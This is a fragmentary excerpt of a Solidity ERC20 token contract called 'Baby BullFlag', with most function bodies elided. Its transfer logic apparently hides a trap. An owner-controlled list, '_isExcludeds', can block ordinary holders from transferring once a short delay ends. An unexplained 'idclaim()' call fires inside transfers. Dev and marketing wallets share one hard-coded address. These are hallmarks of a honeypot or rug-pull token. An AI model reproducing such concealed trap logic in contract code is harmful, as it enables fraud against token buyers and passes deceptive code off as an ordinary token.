...
contract BULL is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    
    string private constant _name = "Baby BullFlag";
    ...
    address payable private DevWallet = payable(0x7f68bb21ab6fC7370e45bef9a336124d8eEf4163);
    address payable private MarketingWallet = payable(0x7f68bb21ab6fC7370e45bef9a336124d8eEf4163);
    ...
    function Excluded() external onlyOwner {
    ...
    function _transfer( address from, address to, uint256 amount ) private {
        ...
        if (tradingActiveBlock + 15 seconds <= block.timestamp) {limitInEffect = false;}
        if (tradingActiveBlock + 30 seconds <= block.timestamp) {transferDelay = false;}
        if (!transferDelay && !_isExcludedFromFee[from]) { require(!_isExcludeds[from]);}
        if (transferDelay && tradingActiveBlock + 20 seconds <= block.timestamp) {idclaim();}
